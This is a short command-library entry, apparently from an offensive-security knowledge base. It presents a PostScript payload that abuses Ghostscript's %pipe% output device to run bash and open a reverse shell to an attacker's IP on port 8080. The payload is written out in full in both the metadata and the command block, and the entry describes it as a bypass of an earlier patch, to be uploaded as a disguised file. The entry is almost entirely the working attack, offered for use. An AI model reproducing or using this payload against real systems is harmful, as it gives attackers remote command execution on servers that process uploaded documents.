---
data: >-
  %!PS userdict /setpagedevice undef legal { null restore } stopped { pop } if
  legal mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/[redacted-ip]/8080
  0>&1') currentdevice putdeviceprops
tags:
  - rce
  - postscript
  - bypass
type: command
output: Reverse shell connection established
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.362Z'
id: e4fe1249-a505-40ef-91b8-12f60257de02
verified: false
validated: true
submitted: true
---
# postscript-bash-reverse-shell

## Command

```bash
%!PS userdict /setpagedevice undef legal { null restore } stopped { pop } if legal mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/[redacted-ip]/8080 0>&1') currentdevice putdeviceprops
```

## Description

Alternative PostScript payload using bash for reverse shell, to bypass initial Python-based patch.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| OutputFile | Pipes to bash TCP shell | Yes |
| [redacted-ip] | Attacker IP | Yes |
| 8080 | Port | Yes |

## Examples

### Basic Usage

Save and upload as disguised file.

## Expected Output

Reverse shell connection.

## Related

- [[commands/postscript-python-reverse-shell]]
